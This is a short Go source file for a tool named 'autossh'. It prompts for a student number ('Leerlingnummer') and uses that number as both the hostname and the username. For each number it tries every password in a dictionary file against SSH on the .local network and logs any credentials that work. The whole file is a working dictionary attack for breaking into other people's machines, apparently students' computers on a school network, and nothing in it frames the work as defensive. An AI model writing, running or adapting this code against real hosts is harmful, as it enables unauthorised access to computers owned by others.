package main

import (
	"fmt"
	"log"
	"os"

	"github.com/cfschilham/autossh/internal/loadcfg"
	"github.com/cfschilham/autossh/internal/sshconn"
)

func main() {
	config, err := loadcfg.LoadConfig()
	if err != nil {
		log.Fatalln(err)
	}
	dict, err := loadcfg.LoadDict(config.DictPath())
	if err != nil {
		log.Fatalln(err)
	}

	if config.Mode() == "manual" {
		var hostname string

		for {
			fmt.Print("Leerlingnummer (type 'exit' to exit): ")
			fmt.Scanln(&hostname)
			if hostname == "exit" {
				os.Exit(0)
			}

			for _, entry := range dict.Pwds() {
				log.Printf("Attempting to establish SSH connection at '%s' using password '%s'\n", hostname+"@"+hostname+".local:22", entry)
				if err := sshconn.SSHConn(hostname+".local:22", hostname, entry, ""); err != nil {
					if config.Verbose() {
						log.Println(err)
					}
					log.Printf("Failed to connect\n")
				} else {
					log.Printf("Connection successfully established!\n")
					log.Printf("Host: '%s' | Pass: '%s'\n", hostname+"@"+hostname+".local", entry)
					break
				}
			}
		}

	} else if config.Mode() == "json" {
		log.Fatalln("cfg/config.yml: whoops, JSON mode is not supported yet!")
	} else {
		log.Fatalf("cfg/config.yml: whoops, '%s' is not a valid mode\n", config.Mode())
	}
}
